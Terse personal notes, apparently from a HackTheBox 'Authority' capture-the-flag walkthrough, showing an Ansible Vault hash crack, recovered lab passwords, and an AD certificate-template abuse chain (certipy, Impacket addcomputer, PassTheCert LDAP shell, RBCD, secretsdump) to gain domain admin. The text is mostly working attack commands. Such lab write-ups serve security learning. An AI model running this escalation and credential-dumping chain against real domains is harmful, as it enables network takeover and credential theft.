we get main.yml
generate new file with hash
cat value.yml
$ANSIBLE_VAULT;1.1;AES256
31356338343963323063373435363261323563393235633365356134616261666433393263373736
3335616263326464633832376261306131303337653964350a363663623132353136346631396662
38656432323830393339336231373637303535613636646561653637386634613862316638353530
3930356637306461350a316466663037303037653761323565343338653934646533663365363035
6531

ansible2john value.yml > main.hash
![[Pasted image 20250218162538.png]]
!@#$%^&*
![[Pasted image 20250218162606.png]]
pWm_@dm!N_!23

we logining there https://authority.htb:8443/pwm/private/config/manager?
![[Pasted image 20250218163938.png]]
![[Pasted image 20250218190742.png]]

![[Pasted image 20250218190713.png]]
lDaP_1n_th3_cle4r!

svs_ldap member of
![[Pasted image 20250218192723.png]]
certipy-ad find -u svc_ldap@authority.htb -p lDaP_1n_th3_cle4r! -vulnerable -enabled
![[Pasted image 20250218192735.png]]
we need a computer account. We can confirm quickly that the
MachineAccountQuota is set to the default value of 10 , so we should have no problem adding a computer account.

netexec ldap 10.10.11.222 -M maq -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
![[Pasted image 20250219124817.png]]


we now add a computer account using addcomputer.py from Impacket
python3 addcomputer.py 'authority.htb/svc_ldap' -method LDAPS -computer-name 'TEST01' -computer-pass 'P@S!@#_DP@ssw0rd!' -dc-ip 10.10.11.222
![[Pasted image 20250218195617.png]]

certipy-ad req -username TEST01$ -password 'P@S!@#_DP@ssw0rd!' -ca AUTHORITY-CA -template CorpVPN -upn administrator@authority.htb -dc-ip 10.10.11.222 -debug
[-] Got error while trying to request TGT: Kerberos SessionError:
KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)

We can use PassTheCert app 
certipy-ad cert -pfx administrator.pfx -nocert -o administrator.key

certipy-ad cert -pfx administrator.pfx -nokey -o administrator.crt

python3 ./Python/passthecert.py -dc-ip 10.10.11.222 -crt administrator.crt -key administrator.key -domain authority.htb -port 636 -action ldap-shell -delegate-to 'AUTHORITY$' -delegate-from 'Test01$'
add_user_to_group svc_ldap administrators
we get root
![[Pasted image 20250221105203.png]]



Xsecond method not working X
python3 ./Python/passthecert.py -dc-ip 10.10.11.222 -crt administrator.crt -key administrator.key -domain authority.htb -port 636 -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'Test01$'

impacket-getST -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator 'authority.htb/TEST01$:P@S!@#_DP@ssw0rd!'
export KRB5CCNAME=Administrator.ccache

impacket-secretsdump -k -no-pass authority.htb/Administrator@authority.authority.htb -just-dc-ntlm
